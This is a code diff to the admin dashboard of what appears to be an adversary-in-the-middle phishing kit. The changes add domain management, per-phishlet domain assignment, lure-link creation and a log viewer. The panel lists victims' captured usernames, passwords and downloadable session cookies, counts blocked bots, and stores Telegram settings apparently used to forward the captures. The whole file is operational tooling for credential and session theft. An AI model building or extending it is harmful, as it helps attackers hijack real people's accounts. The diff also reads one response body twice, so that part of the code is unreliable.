@@ -120,6 +120,12 @@
                 <span class="nav-link-title">Settings</span>
               </a>
             </li>
+            <li class="nav-item" data-tab="logs">
+              <a class="nav-link" href="#" onclick="switchTab('logs')">
+                <span class="nav-link-icon"><span class="ti ti-terminal"></span></span>
+                <span class="nav-link-title">Logs</span>
+              </a>
+            </li>
           </ul>
         </div>
       </div>
@@ -258,6 +264,64 @@
           </div>
         </div>
       </div>
+      <div id="logsTab" class="hidden">
+        <div class="page-header d-print-none">
+          <div class="container-xl">
+            <div class="row g-2 align-items-center">
+              <div class="col">
+                <h2 class="page-title"><span class="ti ti-terminal me-2"></span>System Logs</h2>
+              </div>
+              <div class="col-auto">
+                <div class="input-group" style="max-width: 400px;">
+                  <select id="logLevelFilter" class="form-select form-select-sm" onchange="loadLogs()">
+                    <option value="all">All Levels</option>
+                    <option value="debug">Debug</option>
+                    <option value="info">Info</option>
+                    <option value="warning">Warning</option>
+                    <option value="error">Error</option>
+                    <option value="success">Success</option>
+                  </select>
+                  <select id="logLimitFilter" class="form-select form-select-sm" onchange="loadLogs()" style="max-width: 120px;">
+                    <option value="100">100</option>
+                    <option value="200" selected>200</option>
+                    <option value="500">500</option>
+                    <option value="1000">1000</option>
+                    <option value="2000">2000</option>
+                    <option value="5000">5000</option>
+                  </select>
+                  <button class="btn btn-outline-warning" onclick="loadLogs()"><span class="ti ti-refresh me-1"></span>Refresh</button>
+                  <button class="btn btn-outline-danger" onclick="clearLogs()"><span class="ti ti-trash me-1"></span>Clear</button>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="page-body">
+          <div class="container-xl">
+            <div class="card mt-3">
+              <div class="table-responsive">
+                <table class="table table-vcenter card-table table-striped">
+                  <thead>
+                    <tr>
+                      <th style="width: 160px;">Timestamp</th>
+                      <th style="width: 100px;">Level</th>
+                      <th>Message</th>
+                    </tr>
+                  </thead>
+                  <tbody id="logsBody"></tbody>
+                </table>
+              </div>
+              <div class="card-footer d-flex align-items-center justify-content-between">
+                <p class="m-0 text-muted">Showing <span id="logsCount">0</span> log entries</p>
+                <div class="form-check form-switch">
+                  <input class="form-check-input" type="checkbox" id="autoRefreshLogs" checked>
+                  <label class="form-check-label text-muted small" for="autoRefreshLogs">Auto-refresh (5s)</label>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
       <div id="settingsTab" class="hidden">
         <div class="page-header d-print-none">
           <div class="container-xl">
@@ -287,6 +351,37 @@
                 </div>
               </div>
               <div class="col-lg-6">
+                <div class="card">
+                  <div class="card-header"><h3 class="card-title"><span class="ti ti-world me-2"></span>Domain Settings</h3></div>
+                  <div class="card-body">
+                    <div class="mb-3">
+                      <label class="form-label">Add Domain</label>
+                      <div class="input-group">
+                        <input type="text" id="newDomainInput" class="form-control" placeholder="onlinefileshare.xyz">
+                        <button class="btn btn-outline-warning" onclick="addDomain()"><span class="ti ti-plus me-1"></span>Add</button>
+                      </div>
+                      <small class="text-muted mt-1 d-block">Domains added here can be assigned to any enabled phishlet.</small>
+                    </div>
+                    <div class="mb-3">
+                      <label class="form-label">Available Domains</label>
+                      <div id="domainList" class="d-flex flex-column gap-2">
+                        <span class="text-muted">Loading domains...</span>
+                      </div>
+                    </div>
+                    <hr>
+                    <div>
+                      <label class="form-label">Assign Domain to Phishlet</label>
+                      <div id="phishletDomainAssignments" class="d-flex flex-column gap-2">
+                        <span class="text-muted">Loading phishlets...</span>
+                      </div>
+                    </div>
+                    <div id="domainSettingsStatus" class="mt-3"></div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="row mt-3">
+              <div class="col-12">
                 <div class="card">
                   <div class="card-header"><h3 class="card-title"><span class="ti ti-link me-2"></span>Lure Manager</h3></div>
                   <div class="card-body">
@@ -352,7 +447,7 @@
   <script>
     var authToken = localStorage.getItem('forginx_auth') || '';
     function getAuth() { return authToken; }
-    function apiUrl(path) { return authToken ? path + '?auth=' + encodeURIComponent(authToken) : path; }
+    function apiUrl(path) { if (!authToken) return path; var sep = path.indexOf('?') === -1 ? '?' : '&'; return path + sep + 'auth=' + encodeURIComponent(authToken); }
     function showLogin() { document.getElementById('loginOverlay').classList.remove('hidden'); }
     function hideLogin() { document.getElementById('loginOverlay').classList.add('hidden'); }
     function fmtTime(ts) { if (!ts) return '-'; return new Date(ts * 1000).toLocaleString(); }
@@ -381,8 +476,9 @@
       document.getElementById('dashboardTab').classList.toggle('hidden', name !== 'dashboard');
       document.getElementById('invalidLogsTab').classList.toggle('hidden', name !== 'invalid-logs');
       document.getElementById('validNoCookiesTab').classList.toggle('hidden', name !== 'valid-no-cookies');
+      document.getElementById('logsTab').classList.toggle('hidden', name !== 'logs');
       document.getElementById('settingsTab').classList.toggle('hidden', name !== 'settings');
-      if (name === 'settings' && !window._settingsLoaded) { loadSettings(); loadLuresTab(); }
+      if (name === 'settings' && !window._settingsLoaded) { loadSettings(); loadLuresTab(); loadDomainSettings(); }
     }
     function hasData(s) { return !!(s.username && s.username !== '-') && !!(s.password && s.password !== '-') && !!(s.tokens && Object.keys(s.tokens).length > 0); }
     function cookiesButton(s) { if (s.tokens && Object.keys(s.tokens).length > 0) { return '<button class="btn btn-sm btn-outline-green" onclick="downloadCookies(' + s.id + ')"><span class="ti ti-download me-1"></span>Download</button>'; } return '<span class="text-muted">No Cookies</span>'; }
@@ -410,7 +506,7 @@
         var allData = [];
     function render(rows) { allData = rows; var tbody = document.getElementById('tableBody'); tbody.innerHTML = rows.map(function(r, idx) { return '<tr><td class="fw-bold">' + (idx + 1) + '</td><td><span class="badge bg-blue-lt">' + escapeHtml(r.phishlet) + '</span></td><td class="text-break" style="max-width:180px" title="' + escapeHtml(r.username) + '">' + truncate(r.username || '-', 35) + '</td><td class="text-break text-muted" style="max-width:140px" title="' + escapeHtml(r.password) + '">' + truncate(r.password || '-', 25) + '</td><td>' + cookiesButton(r) + '</td><td class="text-muted" style="max-width:160px" title="' + escapeHtml(r.useragent) + '">' + (r.is_bot ? '<span class="badge bg-red-lt me-1">bot</span>' : '') + truncate(r.useragent || '-', 30) + '</td><td class="text-muted" style="white-space:nowrap">' + (r.location ? '<span class="ti ti-map-pin text-muted me-1"></span>' + escapeHtml(r.location) : '<span class="text-muted">-</span>') + '</td><td class="text-muted font-monospace">' + escapeHtml(r.remote_addr) + '</td><td class="text-muted">' + fmtTime(r.create_time) + '</td></tr>'; }).join(''); document.getElementById('shownCount').textContent = rows.length; document.getElementById('totalCount').textContent = allData.length; }
     function computeStats(rows) { var total = rows.length, withCookies = 0, complete = 0, validNoCookies = 0, bots = 0; rows.forEach(function(r) { if (r.tokens && Object.keys(r.tokens).length > 0) { withCookies++; if (r.username && r.password) complete++; } else { if (r.username || r.password) validNoCookies++; } if (r.is_bot) bots++; }); return { total_sessions: total, with_cookies: withCookies, without_cookies: total - withCookies, valid_access: complete, valid_no_cookies: validNoCookies, bot_access: bots, invalid_logs: 0 }; }
-    function buildCards(stats) { var colors = ['#667eea', '#f5576c', '#4facfe', '#22c55e', '#f59e0b', '#a78bfa', '#e879f9']; var labels = ['Total Sessions', 'With Cookies', 'Without Cookies', 'Valid Access', 'Valid No Cookies', 'Bot Access', 'Invalid Sessions']; var vals = [stats.total_sessions, stats.with_cookies, stats.without_cookies, stats.valid_access, stats.valid_no_cookies, stats.bot_access, stats.invalid_logs]; document.getElementById('statsRow').innerHTML = labels.map(function(l, i) { return '<div class="col-sm-6 col-lg-2"><div class="card" style="background: ' + colors[i % colors.length] + ' !important; border: none !important;"><div class="card-body"><div class="d-flex align-items-center mb-1"><div class="subheader" style="color:rgba(255,255,255,0.85);font-weight:700;font-size:0.7rem;">' + l + '</div></div><div class="d-flex align-items-baseline"><div class="h1 mb-0 me-2 fw-bold" style="color:#fff;font-size:2rem;">' + vals[i] + '</div></div></div></div></div>'; }).join(''); }
+    function buildCards(stats) { var colors = ['#667eea', '#f5576c', '#4facfe', '#22c55e', '#f59e0b', '#a78bfa', '#e879f9']; var labels = ['Total Sessions', 'With Cookies', 'Without Cookies', 'Valid Access', 'Valid No Cookies', 'Blocked Bot 🤖', 'Invalid Sessions']; var vals = [stats.total_sessions, stats.with_cookies, stats.without_cookies, stats.valid_access, stats.valid_no_cookies, stats.bot_access, stats.invalid_logs]; document.getElementById('statsRow').innerHTML = labels.map(function(l, i) { return '<div class="col-sm-6 col-lg-2"><div class="card" style="background: ' + colors[i % colors.length] + ' !important; border: none !important;"><div class="card-body"><div class="d-flex align-items-center mb-1"><div class="subheader" style="color:rgba(255,255,255,0.85);font-weight:700;font-size:0.7rem;">' + l + '</div></div><div class="d-flex align-items-baseline"><div class="h1 mb-0 me-2 fw-bold" style="color:#fff;font-size:2rem;">' + vals[i] + '</div></div></div></div></div>'; }).join(''); }
     function filterTable(q) { if (!q) { render(allData); return; } render(allData.filter(function(r) { return String(r.id).includes(q) || (r.phishlet || '').toLowerCase().includes(q) || (r.username || '').toLowerCase().includes(q) || (r.password || '').toLowerCase().includes(q) || (r.useragent || '').toLowerCase().includes(q) || (r.remote_addr || '').toLowerCase().includes(q) || (r.location || '').toLowerCase().includes(q); })); }
     async function loadSettings() { try { var res = await fetch(apiUrl('/api/settings')); if (!res.ok) throw new Error('HTTP ' + res.status); var data = await res.json(); document.getElementById('chatid').value = data.chatid || ''; document.getElementById('teletoken').value = data.teletoken || ''; window._settingsLoaded = true; } catch (e) { document.getElementById('settingsStatus').innerHTML = '<div class="alert alert-danger mt-2">Failed to load settings: ' + escapeHtml(e.message) + '</div>'; } }
     async function saveSettings() { var btn = document.querySelector('#settingsTab .btn-warning'); btn.disabled = true; btn.innerHTML = '<span class="ti ti-loader spinner me-2"></span>Saving...'; try { var res = await fetch(apiUrl('/api/settings'), { method: 'PUT', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chatid: document.getElementById('chatid').value, teletoken: document.getElementById('teletoken').value }) }); if (!res.ok) throw new Error('HTTP ' + res.status); document.getElementById('settingsStatus').innerHTML = '<div class="alert alert-success mt-2">Settings saved successfully</div>'; setTimeout(function() { document.getElementById('settingsStatus').innerHTML = ''; }, 3000); } catch (e) { document.getElementById('settingsStatus').innerHTML = '<div class="alert alert-danger mt-2">Failed to save: ' + escapeHtml(e.message) + '</div>'; } btn.disabled = false; btn.innerHTML = '<span class="ti ti-device-floppy me-2"></span>Save Settings'; }
@@ -423,10 +519,31 @@
         var sessions = sessJson.sessions || [];
         var rows = [];
         sessions.forEach(function(s) { var r = { id: s.id, phishlet: s.phishlet || '-', username: s.username || '', password: s.password || '', tokens: s.tokens, useragent: s.useragent || '', remote_addr: s.remote_addr || '', create_time: s.create_time, is_bot: s.is_bot || false, location: s.location || '', landing_url: s.landing_url || '', session_id: s.session_id || '', session_open_url: s.session_open_url || '' }; if (hasData(r)) rows.push(r); });
+        
+        // Fetch real stats including bot blocked count from /api/stats
+        var statsRes = await fetch(apiUrl('/api/stats'));
+        var apiStats = { bot_access: 0 };
+        if (statsRes.ok) {
+          var statsJson = await statsRes.json();
+          apiStats = statsJson;
+        }
+        
         var stats = computeStats(rows);
         var results = await Promise.all([loadInvalidLogs(), loadValidNoCookies(), loadVisitors()]);
         stats.invalid_logs = results[0];
         stats.valid_no_cookies = results[1];
+        // Override bot_access with API value (includes blocked bots + bot sessions).
+        // Fall back to computed value if API fails.
+        var apiBotAccess = 0;
+        if (statsRes && statsRes.ok) {
+          try {
+            var statsJson = await statsRes.json();
+            apiBotAccess = statsJson.BotAccess || statsJson.bot_access || 0;
+          } catch (e) { apiBotAccess = 0; }
+        }
+        if (apiBotAccess > 0) {
+          stats.bot_access = apiBotAccess;
+        }
         buildCards(stats);
         rows.reverse(); render(rows);
       } catch (e) {
@@ -494,10 +611,79 @@
       tbody.innerHTML = sorted.map(function(s, idx) { return '<tr><td class="fw-bold">' + (idx + 1) + '</td><td><span class="badge bg-blue-lt">' + escapeHtml(s.phishlet || '-') + '</span></td><td class="text-break" style="max-width:200px" title="' + escapeHtml(s.username) + '">' + truncate(s.username || '-', 35) + '</td><td class="text-break text-muted" style="max-width:160px" title="' + escapeHtml(s.password) + '">' + truncate(s.password || '-', 30) + '</td><td class="text-muted" style="max-width:180px" title="' + escapeHtml(s.useragent) + '">' + (s.is_bot ? '<span class="badge bg-red-lt me-1">bot</span>' : '') + truncate(s.useragent || '-', 30) + '</td><td class="text-muted" style="white-space:nowrap">' + (s.location ? '<span class="ti ti-map-pin text-muted me-1"></span>' + escapeHtml(s.location) : '<span class="text-muted">-</span>') + '</td><td class="text-muted font-monospace">' + escapeHtml(s.remote_addr || '-') + '</td><td class="text-muted">' + fmtTime(s.create_time) + '</td></tr>'; }).join('');
     }
 
+
+    // ===== Domain Settings (Settings tab) =====
+    async function loadDomainSettings() {
+      try {
+        var [dres, pres] = await Promise.all([fetch(apiUrl('/api/domains')), fetch(apiUrl('/api/phishlet-domains'))]);
+        if (!dres.ok || !pres.ok) throw new Error('load failed');
+        var ddata = await dres.json();
+        var pdata = await pres.json();
+        renderDomainList(ddata.domains || []);
+        renderPhishletDomainAssignments(pdata.phishlets || [], pdata.domains || []);
+      } catch (e) { console.error('domain settings load:', e); }
+    }
+    function renderDomainList(domains) {
+      var box = document.getElementById('domainList');
+      if (!domains || domains.length === 0) { box.innerHTML = '<span class="text-muted">No domains added yet.</span>'; return; }
+      box.innerHTML = domains.map(function(d) {
+        return '<div class="d-flex align-items-center justify-content-between p-2" style="background:rgba(255,255,255,0.03);border-radius:8px">' +
+          '<div><span class="badge bg-green-lt me-2">' + escapeHtml(d) + '</span></div>' +
+          '<button class="btn btn-sm btn-outline-danger" onclick="deleteDomain(' + "'" + escapeHtml(d) + "'" + ')"><span class="ti ti-trash"></span></button>' +
+        '</div>';
+      }).join('');
+    }
+    function renderPhishletDomainAssignments(phishlets, domains) {
+      var box = document.getElementById('phishletDomainAssignments');
+      if (!phishlets || phishlets.length === 0) { box.innerHTML = '<span class="text-muted">No enabled phishlets.</span>'; return; }
+      box.innerHTML = phishlets.map(function(p) {
+        var opts = '<option value="">-- None --</option>' + domains.map(function(d) { return '<option value="' + escapeHtml(d) + '"' + (p.domain === d ? ' selected' : '') + '>' + escapeHtml(d) + '</option>'; }).join('');
+        return '<div class="d-flex align-items-center justify-content-between p-2" style="background:rgba(255,255,255,0.03);border-radius:8px">' +
+          '<div><span class="badge bg-blue-lt me-2">' + escapeHtml(p.phishlet) + '</span></div>' +
+          '<select class="form-select form-select-sm" style="max-width:220px" onchange="assignPhishletDomain(' + "'" + escapeHtml(p.phishlet) + "'" + ', this.value)">' + opts + '</select>' +
+        '</div>';
+      }).join('');
+    }
+    async function addDomain() {
+      var input = document.getElementById('newDomainInput');
+      var status = document.getElementById('domainSettingsStatus');
+      var domain = (input.value || '').trim();
+      if (!domain) { status.innerHTML = '<div class="alert alert-danger py-2 mb-0">Enter a domain.</div>'; return; }
+      try {
+        var res = await fetch(apiUrl('/api/domains'), { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({domain: domain}) });
+        var data = await res.json();
+        if (!res.ok) { status.innerHTML = '<div class="alert alert-danger py-2 mb-0">' + escapeHtml(data.error || 'failed') + '</div>'; return; }
+        input.value = '';
+        status.innerHTML = '<div class="alert alert-success py-2 mb-0">Domain added.</div>';
+        await Promise.all([loadDomainSettings(), loadActivePhishlets()]);
+      } catch (e) { status.innerHTML = '<div class="alert alert-danger py-2 mb-0">' + escapeHtml(e.message) + '</div>'; }
+    }
+    async function deleteDomain(domain) {
+      var status = document.getElementById('domainSettingsStatus');
+      try {
+        var res = await fetch(apiUrl('/api/domains/' + encodeURIComponent(domain)), { method: 'DELETE' });
+        var data = await res.json();
+        if (!res.ok) { status.innerHTML = '<div class="alert alert-danger py-2 mb-0">' + escapeHtml(data.error || 'failed') + '</div>'; return; }
+        status.innerHTML = '<div class="alert alert-success py-2 mb-0">Domain deleted.</div>';
+        await Promise.all([loadDomainSettings(), loadActivePhishlets()]);
+      } catch (e) { status.innerHTML = '<div class="alert alert-danger py-2 mb-0">' + escapeHtml(e.message) + '</div>'; }
+    }
+    async function assignPhishletDomain(phishlet, domain) {
+      var status = document.getElementById('domainSettingsStatus');
+      try {
+        var res = await fetch(apiUrl('/api/phishlet-domains'), { method: 'PUT', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phishlet: phishlet, domain: domain}) });
+        var data = await res.json();
+        if (!res.ok) { status.innerHTML = '<div class="alert alert-danger py-2 mb-0">' + escapeHtml(data.error || 'failed') + '</div>'; return; }
+        status.innerHTML = '<div class="alert alert-success py-2 mb-0">Assignment saved.</div>';
+        await Promise.all([loadDomainSettings(), loadActivePhishlets()]);
+      } catch (e) { status.innerHTML = '<div class="alert alert-danger py-2 mb-0">' + escapeHtml(e.message) + '</div>'; }
+    }
+
     // ===== Lure Manager (Settings tab) =====
     async function loadLuresTab() {
       try { await Promise.all([loadActivePhishlets(), loadLures()]); } catch (e) { console.error('lures tab load:', e); }
     }
+    var domainCache = []; // cached domain list for the lure domain picker
     async function loadActivePhishlets() {
       var box = document.getElementById('activePhishlets');
       try {
@@ -505,20 +691,31 @@
         if (!res.ok) { box.innerHTML = '<span class="text-muted">Failed to load phishlets</span>'; return; }
         var data = await res.json();
         var list = data.phishlets || [];
+        // Fetch the current domain list for the per-phishlet domain pickers.
+        try {
+          var dres = await fetch(apiUrl('/api/domains'));
+          if (dres.ok) { var ddata = await dres.json(); domainCache = ddata.domains || []; }
+        } catch (e2) { /* keep cached list */ }
         if (list.length === 0) { box.innerHTML = '<span class="text-muted">No enabled phishlets. Enable one from the terminal first.</span>'; return; }
-        box.innerHTML = list.map(function(p) { return '<div class="d-flex align-items-center justify-content-between p-2" style="background:rgba(255,255,255,0.03);border-radius:8px"><div><span class="badge bg-blue-lt me-2">' + escapeHtml(p.name) + '</span><span class="text-muted" style="font-size:0.8rem">' + escapeHtml(p.domain || '') + '</span></div><button class="btn btn-sm btn-outline-warning" onclick="createLure(\'' + escapeHtml(p.name) + '\')"><span class="ti ti-link me-1"></span>Create Lure</button></div>'; }).join('');
+        box.innerHTML = list.map(function(p) {
+          var opts = '<option value="">-- ' + (p.domain ? 'current: ' + escapeHtml(p.domain) : 'use assigned domain') + ' --</option>' + domainCache.map(function(d) { return '<option value="' + escapeHtml(d) + '"' + (p.domain === d ? ' selected' : '') + '>' + escapeHtml(d) + '</option>'; }).join('');
+          return '<div class="d-flex align-items-center justify-content-between p-2" style="background:rgba(255,255,255,0.03);border-radius:8px"><div><span class="badge bg-blue-lt me-2">' + escapeHtml(p.name) + '</span><span class="text-muted" style="font-size:0.8rem">' + escapeHtml(p.domain || 'no domain') + '</span></div><div class="d-flex align-items-center gap-2"><select id="luredomain-' + escapeHtml(p.name) + '" class="form-select form-select-sm" style="max-width:200px">' + opts + '</select><button class="btn btn-sm btn-outline-warning" onclick="createLure(\'' + escapeHtml(p.name) + '\')"><span class="ti ti-link me-1"></span>Create Lure</button></div></div>';
+        }).join('');
       } catch (e) { box.innerHTML = '<span class="text-muted">Error loading phishlets</span>'; }
     }
     async function createLure(phishlet) {
       var box = document.getElementById('newLureResult');
-      box.innerHTML = '<span class="text-muted">Creating lure for ' + escapeHtml(phishlet) + '...</span>';
+      var domainSel = document.getElementById('luredomain-' + phishlet);
+      var domain = domainSel ? (domainSel.value || '') : '';
+      box.innerHTML = '<span class="text-muted">Creating lure for ' + escapeHtml(phishlet) + (domain ? ' on ' + escapeHtml(domain) : '') + '...</span>';
       try {
-        var res = await fetch(apiUrl('/api/lures'), { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ phishlet: phishlet }) });
+        var res = await fetch(apiUrl('/api/lures'), { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ phishlet: phishlet, domain: domain }) });
         var data = await res.json();
         if (!res.ok) { box.innerHTML = '<div class="alert alert-danger py-2 mb-0">' + escapeHtml(data.error || 'create failed') + '</div>'; return; }
         var l = data.lure;
         box.innerHTML = '<div class="alert alert-success py-2 mb-0"><div class="d-flex align-items-center justify-content-between"><div style="overflow-wrap:anywhere"><strong>' + escapeHtml(l.phishlet) + '</strong> lure created: <a href="' + escapeHtml(l.url) + '" target="_blank" class="text-success">' + escapeHtml(l.url) + '</a></div><button class="btn btn-sm btn-outline-success" onclick="copyLure(\'' + escapeHtml(l.url) + '\')"><span class="ti ti-copy me-1"></span>Copy</button></div></div>';
         loadLures();
+        loadActivePhishlets();
       } catch (e) { box.innerHTML = '<div class="alert alert-danger py-2 mb-0">' + escapeHtml(e.message) + '</div>'; }
     }
     function copyLure(url) { navigator.clipboard.writeText(url).then(function() { }).catch(function() { var ta = document.createElement('textarea'); ta.value = url; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta); }); }
@@ -534,6 +731,61 @@
       } catch (e) { tbody.innerHTML = '<tr><td colspan="5" class="text-center text-muted py-3">Error loading lures</td></tr>'; }
     }
     async function deleteLure(id) { try { var res = await fetch(apiUrl('/api/lures/' + id), { method: 'DELETE' }); if (!res.ok) throw new Error('HTTP ' + res.status); loadLures(); } catch (e) { console.error('delete lure:', e); } }
+
+// ===== Logs Tab =====
+    var logsAutoRefreshInterval = null;
+    async function loadLogs() {
+      var level = document.getElementById('logLevelFilter').value;
+      var limit = parseInt(document.getElementById('logLimitFilter').value, 10);
+      try {
+        var res = await fetch(apiUrl('/api/logs?level=' + encodeURIComponent(level) + '&limit=' + limit));
+        if (!res.ok) throw new Error('HTTP ' + res.status);
+        var data = await res.json();
+        var logs = data.logs || [];
+        var tbody = document.getElementById('logsBody');
+        var countEl = document.getElementById('logsCount');
+        countEl.textContent = logs.length;
+        
+        // Color coding for levels
+        var levelColors = {
+          'debug': 'text-muted',
+          'info': 'text-primary',
+          'warning': 'text-warning',
+          'error': 'text-danger',
+          'success': 'text-success'
+        };
+        
+        tbody.innerHTML = logs.map(function(l) {
+          var colorClass = levelColors[l.level] || '';
+          var ts = new Date(l.timestamp).toLocaleString();
+          return '<tr>' +
+            '<td class="font-monospace text-muted small">' + escapeHtml(ts) + '</td>' +
+            '<td><span class="badge bg-' + (l.level === 'debug' ? 'secondary' : l.level === 'info' ? 'primary' : l.level === 'warning' ? 'warning' : l.level === 'error' ? 'danger' : 'success') + '">' + escapeHtml(l.level.toUpperCase()) + '</span></td>' +
+            '<td class="' + colorClass + '">' + escapeHtml(l.message) + '</td>' +
+          '</tr>';
+        }).join('');
+      } catch (e) {
+        console.error('loadLogs error:', e);
+        document.getElementById('logsBody').innerHTML = '<tr><td colspan="3" class="text-center text-danger py-3">Error loading logs</td></tr>';
+      }
+    }
+    function clearLogs() {
+      // We can't clear server buffer from client, but we can clear the view
+      document.getElementById('logsBody').innerHTML = '';
+      document.getElementById('logsCount').textContent = '0';
+    }
+    function startLogsAutoRefresh() {
+      if (logsAutoRefreshInterval) clearInterval(logsAutoRefreshInterval);
+      if (document.getElementById('autoRefreshLogs').checked) {
+        logsAutoRefreshInterval = setInterval(function() {
+          if (!document.getElementById('logsTab').classList.contains('hidden')) {
+            loadLogs();
+          }
+        }, 5000);
+      }
+    }
+    document.getElementById('autoRefreshLogs').addEventListener('change', startLogsAutoRefresh);
+
     document.addEventListener('DOMContentLoaded', function() { if (authToken) { loadData(); } else { var p = new URLSearchParams(window.location.search); var urlToken = p.get('auth'); if (urlToken) { authToken = urlToken; localStorage.setItem('forginx_auth', authToken); } if (authToken) { loadData(); } else { showLogin(); } } });
     setInterval(loadData, 10000);
     document.getElementById('searchInput').addEventListener('input', function() { filterTable(this.value.toLowerCase().trim()); });
